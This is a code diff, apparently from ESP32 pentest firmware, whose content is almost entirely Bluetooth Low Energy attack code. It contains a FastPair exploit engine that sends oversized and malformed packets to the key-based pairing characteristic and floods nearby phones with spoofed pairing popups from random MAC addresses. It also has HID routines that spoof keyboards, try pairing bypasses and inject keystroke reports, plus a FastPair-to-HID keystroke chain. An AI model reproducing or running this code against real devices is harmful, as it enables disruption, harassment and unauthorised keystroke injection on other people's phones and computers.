@@ -15,7 +15,6 @@ extern volatile int tftWidth;
 extern volatile int tftHeight;
 
 String globalScript = "";
-
 static ScannerData scannerData;
 
 bool BLEStateManager::bleInitialized = false;
@@ -26,39 +25,31 @@ bool BLEStateManager::initBLE(const String& name, int powerLevel) {
     if(bleInitialized) {
         deinitBLE(true);
     }
-
     std::string nameStr = name.c_str();
     NimBLEDevice::init(nameStr);
     NimBLEDevice::setPower((esp_power_level_t)powerLevel);
-
     currentDeviceName = name;
     bleInitialized = true;
-
     return true;
 }
 
 void BLEStateManager::deinitBLE(bool immediate) {
     if(!bleInitialized) return;
-
     if(immediate) {
         cleanupAllClients();
     }
-
     NimBLEDevice::deinit(true);
-
     bleInitialized = false;
     currentDeviceName = "";
 }
 
 void BLEStateManager::registerClient(NimBLEClient* client) {
     if(!client) return;
-
     activeClients.push_back(client);
 }
 
 void BLEStateManager::unregisterClient(NimBLEClient* client) {
     if(!client) return;
-
     for(auto it = activeClients.begin(); it != activeClients.end(); ++it) {
         if(*it == client) {
             activeClients.erase(it);
@@ -106,7 +97,6 @@ void BLEAttackManager::prepareForConnection() {
         BLEStateManager::deinitBLE();
         delay(300);
     }
-
     BLEStateManager::initBLE("Bruce-Attack", ESP_PWR_LVL_P9);
     NimBLEDevice::setMTU(250);
     NimBLEDevice::setSecurityAuth(true, true, true);
@@ -121,9 +111,7 @@ void BLEAttackManager::cleanupAfterAttack() {
 bool BLEAttackManager::connectToDevice(NimBLEAddress target, NimBLEClient** outClient, bool useExploitHandshake) {
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient) return false;
-
     BLEStateManager::registerClient(pClient);
-
     if(useExploitHandshake) {
         pClient->setConnectTimeout(12);
         pClient->setConnectionParams(6, 6, 0, 100);
@@ -131,13 +119,11 @@ bool BLEAttackManager::connectToDevice(NimBLEAddress target, NimBLEClient** outC
         pClient->setConnectTimeout(8);
         pClient->setConnectionParams(12, 12, 0, 400);
     }
-
     bool connected = pClient->connect(target, false);
     if(connected) {
         *outClient = pClient;
         return true;
     }
-
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     return false;
@@ -153,14 +139,12 @@ DeviceProfile BLEAttackManager::profileDevice(NimBLEAddress target) {
     profile.hasHID = false;
     profile.hasBattery = false;
     profile.hasDeviceInfo = false;
-
     prepareForConnection();
     NimBLEClient* pClient = nullptr;
     if(!connectToDevice(target, &pClient, false)) {
         cleanupAfterAttack();
         return profile;
     }
-
     profile.connected = true;
     if(pClient->discoverAttributes()) {
         const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
@@ -173,7 +157,6 @@ DeviceProfile BLEAttackManager::profileDevice(NimBLEAddress target) {
             if(uuidStr.find("1812") != std::string::npos) profile.hasHID = true;
             if(uuidStr.find("180f") != std::string::npos) profile.hasBattery = true;
             if(uuidStr.find("180a") != std::string::npos) profile.hasDeviceInfo = true;
-
             const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
             for(auto& ch : chars) {
                 std::string charUuid = ch->getUUID().toString();
@@ -186,7 +169,6 @@ DeviceProfile BLEAttackManager::profileDevice(NimBLEAddress target) {
             }
         }
     }
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
@@ -273,39 +255,28 @@ private:
         uint32_t modelId;
         String deviceType;
     };
-    
     std::vector<FastPairDeviceInfo> discoveredDevices;
-    
 public:
     FastPairExploitEngine() {}
-    
     std::vector<FastPairDeviceInfo> scanForFastPairDevices(int duration = 10) {
         discoveredDevices.clear();
-        
         AutoCleanup cleanup([]() {
             BLEStateManager::deinitBLE(true);
         });
-        
         showAttackProgress("Scanning for FastPair devices...", TFT_CYAN);
-        
         BLEStateManager::initBLE("FastPair-Scanner", ESP_PWR_LVL_P9);
         NimBLEScan* pScan = NimBLEDevice::getScan();
         if(!pScan) return discoveredDevices;
-        
         pScan->setActiveScan(true);
         pScan->setInterval(97);
         pScan->setWindow(67);
-        
         pScan->start(duration, false);
         NimBLEScanResults results = pScan->getResults();
-        
         for(int i = 0; i < results.getCount(); i++) {
             const NimBLEAdvertisedDevice* device = results.getDevice(i);
-            
             String address = device->getAddress().toString().c_str();
             String name = device->getName().c_str();
             int rssi = device->getRSSI();
-            
             bool hasFastPair = false;
             if(device->haveServiceUUID()) {
                 std::string uuid = device->getServiceUUID().toString();
@@ -313,7 +284,6 @@ public:
                     hasFastPair = true;
                 }
             }
-            
             uint32_t modelId = 0;
             if(device->haveManufacturerData()) {
                 std::string manufData = device->getManufacturerData();
@@ -326,7 +296,6 @@ public:
                     }
                 }
             }
-            
             if(hasFastPair || modelId != 0) {
                 FastPairDeviceInfo info;
                 info.address = device->getAddress();
@@ -336,52 +305,40 @@ public:
                 info.connected = false;
                 info.modelId = modelId;
                 info.deviceType = getDeviceTypeFromModelId(modelId);
-                
                 discoveredDevices.push_back(info);
-                
                 showAttackProgress(String("Found: " + info.name + " (" + info.deviceType + ")").c_str(), TFT_GREEN);
             }
         }
-        
         pScan->stop();
         return discoveredDevices;
     }
-    
     bool exploitFastPairConnection(NimBLEAddress target, FastPairExploitType exploitType = FP_EXPLOIT_ALL) {
         AutoCleanup cleanup([]() {
             BLEStateManager::deinitBLE(true);
         });
-        
         showAttackProgress("Preparing FastPair exploit...", TFT_ORANGE);
-        
         BLEAttackManager bleManager;
         bleManager.prepareForConnection();
-        
         NimBLEClient* pClient = nullptr;
         if(!bleManager.connectToDevice(target, &pClient, true)) {
             showAttackProgress("Failed to connect to device", TFT_RED);
             return false;
         }
-        
         BLEStateManager::registerClient(pClient);
         showAttackProgress("Connected! Finding FastPair service...", TFT_GREEN);
-        
         NimBLERemoteService* pFastPairService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
         if(!pFastPairService) {
             showAttackProgress("No FastPair service found", TFT_RED);
             pClient->disconnect();
             return false;
         }
-        
         NimBLERemoteCharacteristic* pKBPChar = findKBPCharacteristic(pFastPairService);
         if(!pKBPChar) {
             showAttackProgress("No KBP characteristic found", TFT_RED);
             pClient->disconnect();
             return false;
         }
-        
         bool exploitSuccess = false;
-        
         switch(exploitType) {
             case FP_EXPLOIT_MEMORY_CORRUPTION:
                 exploitSuccess = executeMemoryCorruption(pKBPChar);
@@ -402,11 +359,9 @@ public:
                 exploitSuccess = executeAllExploits(pKBPChar, target);
                 break;
         }
-        
         pClient->disconnect();
         BLEStateManager::unregisterClient(pClient);
         NimBLEDevice::deleteClient(pClient);
-        
         if(exploitSuccess) {
             showAttackProgress("FastPair exploit successful!", TFT_GREEN);
             logExploitResult(target, exploitType, true);
@@ -414,59 +369,43 @@ public:
             showAttackProgress("FastPair exploit failed", TFT_RED);
             logExploitResult(target, exploitType, false);
         }
-        
         return exploitSuccess;
     }
-    
     void spamFastPairPopups(FastPairPopupType popupType = FP_POPUP_REGULAR, int count = 50) {
         AutoCleanup cleanup([]() {
             BLEStateManager::deinitBLE(true);
         });
-        
         showAttackProgress("Starting FastPair popup spam...", TFT_PURPLE);
-        
         for(int i = 0; i < count; i++) {
             if(check(EscPress)) break;
-            
             uint8_t mac[6];
             generateRandomMac(mac);
-            
             uint32_t modelId = selectModelForPopup(popupType);
-            
             BLEStateManager::initBLE("", ESP_PWR_LVL_P9);
-            
             NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
             if(pAdvertising) {
                 uint8_t fpData[14];
                 createFastPairAdvertisement(fpData, modelId);
-                
                 pAdvertising->setManufacturerData(fpData, sizeof(fpData));
                 pAdvertising->start(0);
                 delay(20);
                 pAdvertising->stop();
             }
-            
             BLEStateManager::deinitBLE(true);
             delay(50);
-            
             if(i % 10 == 0) {
                 showAttackProgress(String("Sent " + String(i) + " popups").c_str(), TFT_PURPLE);
             }
         }
-        
         showAttackProgress("Popup spam completed", TFT_GREEN);
     }
-    
     bool testVulnerability(NimBLEAddress target) {
         showAttackProgress("Testing FastPair vulnerability...", TFT_CYAN);
-        
         bool vulnerable = false;
-        
         vulnerable |= testServiceDiscovery(target);
         vulnerable |= testCharacteristicAccess(target);
         vulnerable |= testBufferOverflow(target);
         vulnerable |= testStateConfusion(target);
-        
         std::vector<String> results;
         results.push_back("FASTPAIR VULNERABILITY TEST");
         results.push_back("Target: " + String(target.toString().c_str()));
@@ -476,61 +415,45 @@ public:
         results.push_back("State Confusion: " + String(testStateConfusion(target) ? "VULNERABLE" : "SAFE"));
         results.push_back("");
         results.push_back("Overall: " + String(vulnerable ? "VULNERABLE" : "SAFE"));
-        
         showDeviceInfoScreen("TEST RESULTS", results, vulnerable ? TFT_ORANGE : TFT_GREEN, TFT_BLACK);
-        
         return vulnerable;
     }
-    
 private:
     NimBLERemoteCharacteristic* findKBPCharacteristic(NimBLERemoteService* service) {
         if(!service) return nullptr;
-        
         const char* kbpUuids[] = {
             "a92ee202-5501-4e6b-90fb-79a8c1f2e5a8",
             "fe2c1234-8366-4814-8eb0-01de32100bea",
             "0000fe2c-0000-1000-8000-00805f9b34fb",
             nullptr
         };
-        
         for(int i = 0; kbpUuids[i] != nullptr; i++) {
             NimBLERemoteCharacteristic* ch = service->getCharacteristic(NimBLEUUID(kbpUuids[i]));
             if(ch && ch->canWrite()) return ch;
         }
-        
         const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
         for(auto& ch : chars) {
             if(ch->canWrite()) return ch;
         }
-        
         return nullptr;
     }
-    
     bool executeMemoryCorruption(NimBLERemoteCharacteristic* pChar) {
         showAttackProgress("Executing memory corruption...", TFT_RED);
-        
         uint8_t overflowPacket[512];
         memset(overflowPacket, 0x41, sizeof(overflowPacket));
-        
         overflowPacket[0] = 0x00;
         overflowPacket[1] = 0x00;
-        
         for(int i = 2; i < 67; i++) {
             overflowPacket[i] = 0xFF;
         }
-        
         for(int i = 67; i < sizeof(overflowPacket); i++) {
             overflowPacket[i] = i % 256;
         }
-        
         return pChar->writeValue(overflowPacket, sizeof(overflowPacket), true);
     }
-    
     bool executeStateConfusion(NimBLERemoteCharacteristic* pChar) {
         showAttackProgress("Executing state confusion...", TFT_YELLOW);
-        
         bool anySuccess = false;
-        
         uint8_t invalidStates[][10] = {
             {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
             {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
@@ -538,105 +461,76 @@ private:
             {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
             {0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
         };
-        
         for(int i = 0; i < 5; i++) {
             bool sent = pChar->writeValue(invalidStates[i], 10, true);
             if(sent) anySuccess = true;
             delay(100);
         }
-        
         return anySuccess;
     }
-    
     bool executeCryptoOverflow(NimBLERemoteCharacteristic* pChar) {
         showAttackProgress("Executing crypto overflow...", TFT_ORANGE);
-        
         uint8_t malformedKey[67] = {0};
         malformedKey[0] = 0x00;
         malformedKey[1] = 0x00;
-        
         malformedKey[2] = 0x04;
         for(int i = 3; i < 67; i++) {
             malformedKey[i] = (i % 2 == 0) ? 0xFF : 0x00;
         }
-        
         return pChar->writeValue(malformedKey, sizeof(malformedKey), true);
     }
-    
     bool executeHandshakeFault(NimBLERemoteCharacteristic* pChar) {
         showAttackProgress("Executing handshake fault...", TFT_CYAN);
-        
         bool anySuccess = false;
-        
         for(int i = 0; i < 10; i++) {
             uint8_t handshake[67] = {0};
             handshake[0] = 0x00;
             handshake[1] = 0x00;
-            
             for(int j = 2; j < 67; j++) {
                 handshake[j] = esp_random() & 0xFF;
             }
-            
             bool sent = pChar->writeValue(handshake, sizeof(handshake), true);
             if(sent) anySuccess = true;
             delay(50);
         }
-        
         return anySuccess;
     }
-    
     bool executeRapidConnection(NimBLEAddress target, NimBLERemoteCharacteristic* pChar) {
         showAttackProgress("Executing rapid connection attack...", TFT_MAGENTA);
-        
         bool anySuccess = false;
-        
         for(int i = 0; i < 20; i++) {
             BLEStateManager::deinitBLE(true);
             delay(10);
-            
             BLEAttackManager bleManager;
             bleManager.prepareForConnection();
-            
             NimBLEClient* pClient = nullptr;
             if(bleManager.connectToDevice(target, &pClient, true)) {
                 anySuccess = true;
-                
                 uint8_t junk[100];
                 memset(junk, i % 256, sizeof(junk));
                 pChar->writeValue(junk, sizeof(junk), true);
-                
                 pClient->disconnect();
                 BLEStateManager::unregisterClient(pClient);
                 NimBLEDevice::deleteClient(pClient);
             }
             delay(20);
         }
-        
         return anySuccess;
     }
-    
     bool executeAllExploits(NimBLERemoteCharacteristic* pChar, NimBLEAddress target) {
         showAttackProgress("Executing all FastPair exploits...", TFT_RED);
-        
         bool success = false;
-        
         success |= executeMemoryCorruption(pChar);
         delay(200);
-        
         success |= executeStateConfusion(pChar);
         delay(200);
-        
         success |= executeCryptoOverflow(pChar);
         delay(200);
-        
         success |= executeHandshakeFault(pChar);
         delay(200);
-        
         success |= executeRapidConnection(target, pChar);
-        
         return success;
     }
-    
     uint32_t selectModelForPopup(FastPairPopupType type) {
         switch(type) {
             case FP_POPUP_FUN:
@@ -649,46 +543,37 @@ private:
                 return randomRegularModel();
         }
     }
-    
     uint32_t randomRegularModel() {
         int regularModels[] = {0x000047, 0x000048, 0x00000A, 0x0000F0, 0x000006};
         return regularModels[random(sizeof(regularModels)/sizeof(regularModels[0]))];
     }
-    
     uint32_t randomFunModel() {
         int funModels[] = {0xF00100, 0xF00101, 0xF00103, 0xF00104, 0xF00105};
         return funModels[random(sizeof(funModels)/sizeof(funModels[0]))];
     }
-    
     uint32_t randomPrankModel() {
         int prankModels[] = {0xF01011, 0xF38C02, 0xF00106};
         return prankModels[random(sizeof(prankModels)/sizeof(prankModels[0]))];
     }
-    
     uint32_t selectCustomModel() {
         return 0x000047;
     }
-    
     void createFastPairAdvertisement(uint8_t* buffer, uint32_t modelId) {
         buffer[0] = 0x03;
         buffer[1] = 0x03;
         buffer[2] = 0x2C;
         buffer[3] = 0xFE;
-        
         buffer[4] = 0x06;
         buffer[5] = 0x16;
         buffer[6] = 0x2C;
         buffer[7] = 0xFE;
-        
         buffer[8] = (modelId >> 16) & 0xFF;
         buffer[9] = (modelId >> 8) & 0xFF;
         buffer[10] = modelId & 0xFF;
-        
         buffer[11] = 0x02;
         buffer[12] = 0x0A;
         buffer[13] = 0xC3;
     }
-    
     String getDeviceTypeFromModelId(uint32_t modelId) {
         for(int i = 0; fastpair_models[i].name != nullptr; i++) {
             if(fastpair_models[i].modelId == modelId) {
@@ -697,57 +582,43 @@ private:
         }
         return "Unknown";
     }
-    
     bool testServiceDiscovery(NimBLEAddress target) {
         AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
-        
         BLEAttackManager bleManager;
         bleManager.prepareForConnection();
-        
         NimBLEClient* pClient = nullptr;
         if(!bleManager.connectToDevice(target, &pClient, false)) {
             return false;
         }
-        
         NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
         bool hasService = (pService != nullptr);
-        
         pClient->disconnect();
         return hasService;
     }
-    
     bool testCharacteristicAccess(NimBLEAddress target) {
         AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
-        
         BLEAttackManager bleManager;
         bleManager.prepareForConnection();
-        
         NimBLEClient* pClient = nullptr;
         if(!bleManager.connectToDevice(target, &pClient, false)) {
             return false;
         }
-        
         NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
         if(!pService) {
             pClient->disconnect();
             return false;
         }
-        
         NimBLERemoteCharacteristic* pChar = findKBPCharacteristic(pService);
         bool hasAccess = (pChar != nullptr && pChar->canWrite());
-        
         pClient->disconnect();
         return hasAccess;
     }
-    
     bool testBufferOverflow(NimBLEAddress target) {
         return false;
     }
-    
     bool testStateConfusion(NimBLEAddress target) {
         return false;
     }
-    
     void logExploitResult(NimBLEAddress target, FastPairExploitType type, bool success) {
         String exploitName;
         switch(type) {
@@ -758,12 +629,10 @@ private:
             case FP_EXPLOIT_RAPID_CONNECTION: exploitName = "Rapid Connection"; break;
             case FP_EXPLOIT_ALL: exploitName = "All Exploits"; break;
         }
-        
         Serial.println(String("FastPair Exploit: ") + exploitName + 
                       " | Target: " + target.toString().c_str() + 
                       " | Success: " + (success ? "YES" : "NO"));
     }
-    
     void generateRandomMac(uint8_t* mac) {
         esp_fill_random(mac, 6);
         mac[0] = (mac[0] & 0xFE) | 0x02;
@@ -773,22 +642,18 @@ private:
 void runFastPairScan(NimBLEAddress target) {
     FastPairExploitEngine fpEngine;
     auto devices = fpEngine.scanForFastPairDevices(15);
-    
     std::vector<String> lines;
     lines.push_back("FASTPAIR DEVICE SCAN");
     lines.push_back("Found: " + String(devices.size()) + " devices");
     lines.push_back("");
-    
     for(int i = 0; i < std::min(6, (int)devices.size()); i++) {
         String deviceInfo = devices[i].name + " (" + devices[i].deviceType + ")";
         if(deviceInfo.length() > 30) deviceInfo = deviceInfo.substring(0, 27) + "...";
         lines.push_back(deviceInfo);
     }
-    
     if(devices.size() > 6) {
         lines.push_back("... and " + String(devices.size() - 6) + " more");
     }
-    
     showDeviceInfoScreen("SCAN RESULTS", lines, TFT_BLUE, TFT_WHITE);
 }
 
@@ -824,10 +689,8 @@ void runFastPairAllExploits(NimBLEAddress target) {
 
 void runFastPairHIDChain(NimBLEAddress target) {
     FastPairExploitEngine fpEngine;
-    
     if(fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_STATE_CONFUSION)) {
         showAttackProgress("FastPair successful! Pivoting to HID...", TFT_GREEN);
-        
         HIDAttackServiceClass hidAttack;
         if(hidAttack.injectKeystrokes(target)) {
             showAttackResult(true, "FastPair → HID chain successful!");
@@ -842,7 +705,6 @@ void runFastPairHIDChain(NimBLEAddress target) {
 NimBLEClient* attemptConnectionWithStrategies(NimBLEAddress target, String& connectionMethod) {
     NimBLEClient* pClient = nullptr;
     showAttackProgress("Trying normal connection...", TFT_WHITE);
-
     BLEAttackManager bleManager;
     bleManager.prepareForConnection();
     if(bleManager.connectToDevice(target, &pClient, false)) {
@@ -850,7 +712,6 @@ NimBLEClient* attemptConnectionWithStrategies(NimBLEAddress target, String& conn
         return pClient;
     }
     bleManager.cleanupAfterAttack();
-
     delay(500);
     showAttackProgress("Trying aggressive connection...", TFT_YELLOW);
     bleManager.prepareForConnection();
@@ -868,7 +729,6 @@ NimBLEClient* attemptConnectionWithStrategies(NimBLEAddress target, String& conn
         NimBLEDevice::deleteClient(pClient);
     }
     bleManager.cleanupAfterAttack();
-
     delay(500);
     showAttackProgress("Trying exploit-based connection...", TFT_ORANGE);
     BLEStateManager::deinitBLE(true);
@@ -878,7 +738,6 @@ NimBLEClient* attemptConnectionWithStrategies(NimBLEAddress target, String& conn
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
     NimBLEDevice::setSecurityAuth(false, false, false);
     delay(500);
-
     pClient = NimBLEDevice::createClient();
     if(pClient) {
         BLEStateManager::registerClient(pClient);
@@ -894,7 +753,6 @@ NimBLEClient* attemptConnectionWithStrategies(NimBLEAddress target, String& conn
         BLEStateManager::unregisterClient(pClient);
         NimBLEDevice::deleteClient(pClient);
     }
-
     bool hasHFP = false;
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
@@ -905,7 +763,6 @@ NimBLEClient* attemptConnectionWithStrategies(NimBLEAddress target, String& conn
         }
         xSemaphoreGive(scannerData.mutex);
     }
-
     if(hasHFP) {
         showAttackProgress("Trying HFP exploit connection...", TFT_CYAN);
         HFPExploitEngine hfp;
@@ -923,7 +780,6 @@ NimBLEClient* attemptConnectionWithStrategies(NimBLEAddress target, String& conn
             }
         }
     }
-
     return nullptr;
 }
 
@@ -945,10 +801,8 @@ HIDDeviceProfile HIDExploitEngine::analyzeHIDDevice(NimBLEAddress target, const 
     profile.isLinuxDevice = false;
     profile.isIoTDevice = false;
     profile.suggestedAttack = "Standard";
-
     String nameLower = name;
     nameLower.toLowerCase();
-
     if(nameLower.indexOf("apple") != -1 || nameLower.indexOf("magic") != -1 || nameLower.indexOf("ipad") != -1 || 
        nameLower.indexOf("iphone") != -1 || nameLower.indexOf("mac") != -1 || name.indexOf("Apple") != -1) {
         profile.osType = "macOS/iOS";
@@ -980,7 +834,6 @@ HIDDeviceProfile HIDExploitEngine::analyzeHIDDevice(NimBLEAddress target, const 
         profile.suggestedAttack = "StateConfusion";
         profile.requiresAuthentication = true;
     }
-
     if(rssi > -50) {
         profile.connectionBehavior = 2;
     } else if(rssi > -70) {
@@ -988,7 +841,6 @@ HIDDeviceProfile HIDExploitEngine::analyzeHIDDevice(NimBLEAddress target, const 
     } else {
         profile.connectionBehavior = 0;
     }
-
     return profile;
 }
 
@@ -996,15 +848,12 @@ bool HIDExploitEngine::tryAppleMagicSpoof(NimBLEAddress target, HIDDeviceProfile
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("Spoofing Apple Magic Keyboard...", TFT_CYAN);
-
     BLEStateManager::deinitBLE();
     delay(300);
     BLEStateManager::initBLE("Magic Keyboard");
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
     NimBLEDevice::setSecurityAuth(false, false, false);
-
     NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
     if(pAdvertising) {
         uint8_t appleData[] = {0x4C, 0x00, 0x02, 0x00};
@@ -1015,16 +864,12 @@ bool HIDExploitEngine::tryAppleMagicSpoof(NimBLEAddress target, HIDDeviceProfile
         delay(100);
         pAdvertising->stop();
     }
-
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient) return false;
-
     BLEStateManager::registerClient(pClient);
-
     pClient->setConnectTimeout(6);
     pClient->setConnectionParams(12, 12, 0, 400);
     bool connected = pClient->connect(target, false);
-
     if(connected) {
         showAttackProgress("Apple spoof successful!", TFT_GREEN);
         pClient->disconnect();
@@ -1033,7 +878,6 @@ bool HIDExploitEngine::tryAppleMagicSpoof(NimBLEAddress target, HIDDeviceProfile
         cleanup.disable();
         return true;
     }
-
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     return false;
@@ -1043,28 +887,21 @@ bool HIDExploitEngine::tryWindowsHIDBypass(NimBLEAddress target, HIDDeviceProfil
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("Attempting Windows HID bypass...", TFT_CYAN);
-
     BLEStateManager::deinitBLE();
     delay(300);
     BLEStateManager::initBLE("HID Keyboard");
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
     NimBLEDevice::setSecurityAuth(true, false, false);
-
     for(int attempt = 0; attempt < 3; attempt++) {
         NimBLEClient* pClient = NimBLEDevice::createClient();
         if(pClient) {
             BLEStateManager::registerClient(pClient);
-
             pClient->setConnectTimeout(4);
-
             if(attempt == 0) pClient->setConnectionParams(6, 6, 0, 100);
             else if(attempt == 1) pClient->setConnectionParams(200, 200, 0, 600);
             else pClient->setConnectionParams(7, 3200, 0, 800);
-
             bool connected = pClient->connect(target, false);
-
             if(connected) {
                 showAttackProgress("Windows bypass successful!", TFT_GREEN);
                 pClient->disconnect();
@@ -1078,7 +915,6 @@ bool HIDExploitEngine::tryWindowsHIDBypass(NimBLEAddress target, HIDDeviceProfil
         }
         delay(200);
     }
-
     return false;
 }
 
@@ -1086,25 +922,18 @@ bool HIDExploitEngine::tryAndroidJustWorks(NimBLEAddress target, HIDDeviceProfil
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("Testing Android Just-Works pairing...", TFT_CYAN);
-
     BLEStateManager::deinitBLE();
     delay(300);
     BLEStateManager::initBLE("Android Keyboard");
     NimBLEDevice::setSecurityAuth(false, false, false);
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient) return false;
-
     BLEStateManager::registerClient(pClient);
-
     pClient->setConnectTimeout(8);
     pClient->setConnectionParams(12, 12, 0, 400);
-
     bool connected = pClient->connect(target, true);
-
     if(connected) {
         showAttackProgress("Android Just-Works worked!", TFT_GREEN);
         pClient->disconnect();
@@ -1113,7 +942,6 @@ bool HIDExploitEngine::tryAndroidJustWorks(NimBLEAddress target, HIDDeviceProfil
         cleanup.disable();
         return true;
     }
-
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     return false;
@@ -1123,29 +951,21 @@ bool HIDExploitEngine::tryBootProtocolInjection(NimBLEAddress target, HIDDeviceP
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("Attempting Boot Protocol injection...", TFT_CYAN);
-
     BLEStateManager::deinitBLE();
     delay(300);
     BLEStateManager::initBLE("Boot Keyboard");
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient) return false;
-
     BLEStateManager::registerClient(pClient);
-
     pClient->setConnectTimeout(5);
     pClient->setConnectionParams(6, 6, 0, 100);
-
     bool connected = pClient->connect(target, false);
-
     if(connected) {
         NimBLERemoteService* pHIDService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
         if(pHIDService) {
             uint8_t bootReport[] = {0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00};
-
             const std::vector<NimBLERemoteCharacteristic*>& chars = pHIDService->getCharacteristics(true);
             for(auto& ch : chars) {
                 if(ch->canWrite()) {
@@ -1154,7 +974,6 @@ bool HIDExploitEngine::tryBootProtocolInjection(NimBLEAddress target, HIDDeviceP
                 }
             }
         }
-
         showAttackProgress("Boot Protocol injection successful!", TFT_GREEN);
         pClient->disconnect();
         BLEStateManager::unregisterClient(pClient);
@@ -1162,7 +981,6 @@ bool HIDExploitEngine::tryBootProtocolInjection(NimBLEAddress target, HIDDeviceP
         cleanup.disable();
         return true;
     }
-
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     return false;
@@ -1172,23 +990,18 @@ bool HIDExploitEngine::tryRapidStateConfusion(NimBLEAddress target, HIDDevicePro
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("Rapid state confusion attack...", TFT_CYAN);
-
     for(int i = 0; i < 5; i++) {
         BLEStateManager::deinitBLE(true);
         delay(50);
         std::string confusionName = "Confusion" + std::to_string(i);
         NimBLEDevice::init(confusionName);
         NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
         NimBLEClient* pClient = NimBLEDevice::createClient();
         if(pClient) {
             BLEStateManager::registerClient(pClient);
-
             pClient->setConnectTimeout(1);
             pClient->setConnectionParams(6, 6, 0, 100);
-
             bool connected = pClient->connect(target, false);
             if(connected) {
                 showAttackProgress("State confusion worked!", TFT_GREEN);
@@ -1203,7 +1016,6 @@ bool HIDExploitEngine::tryRapidStateConfusion(NimBLEAddress target, HIDDevicePro
         }
         delay(100);
     }
-
     return false;
 }
 
@@ -1211,14 +1023,11 @@ bool HIDExploitEngine::tryHIDReportPreconnection(NimBLEAddress target, HIDDevice
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("HID report pre-connection attack...", TFT_CYAN);
-
     BLEStateManager::deinitBLE();
     delay(300);
     BLEStateManager::initBLE("Preconnect HID");
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
     NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
     if(pAdvertising) {
         uint8_t hidReport[] = {0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00};
@@ -1229,15 +1038,11 @@ bool HIDExploitEngine::tryHIDReportPreconnection(NimBLEAddress target, HIDDevice
         delay(50);
         pAdvertising->stop();
     }
-
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient) return false;
-
     BLEStateManager::registerClient(pClient);
-
     pClient->setConnectTimeout(6);
     bool connected = pClient->connect(target, false);
-
     if(connected) {
         showAttackProgress("Pre-connection attack worked!", TFT_GREEN);
         pClient->disconnect();
@@ -1246,7 +1051,6 @@ bool HIDExploitEngine::tryHIDReportPreconnection(NimBLEAddress target, HIDDevice
         cleanup.disable();
         return true;
     }
-
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     return false;
@@ -1256,9 +1060,7 @@ bool HIDExploitEngine::tryConnectionParameterAttack(NimBLEAddress target, HIDDev
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("Connection parameter attack...", TFT_CYAN);
-
     const int paramSets[][4] = {
         {6, 6, 0, 100},
         {200, 200, 0, 600},
@@ -1267,21 +1069,17 @@ bool HIDExploitEngine::tryConnectionParameterAttack(NimBLEAddress target, HIDDev
         {24, 40, 2, 400},
         {80, 80, 4, 1000}
     };
-
     for(int i = 0; i < 6; i++) {
         BLEStateManager::deinitBLE(true);
         delay(100);
         std::string paramName = "ParamAttack" + std::to_string(i);
         NimBLEDevice::init(paramName);
         NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
         NimBLEClient* pClient = NimBLEDevice::createClient();
         if(pClient) {
             BLEStateManager::registerClient(pClient);
-
             pClient->setConnectTimeout(4);
             pClient->setConnectionParams(paramSets[i][0], paramSets[i][1], paramSets[i][2], paramSets[i][3]);
-
             bool connected = pClient->connect(target, false);
             if(connected) {
                 showAttackProgress("Parameter attack successful!", TFT_GREEN);
@@ -1295,7 +1093,6 @@ bool HIDExploitEngine::tryConnectionParameterAttack(NimBLEAddress target, HIDDev
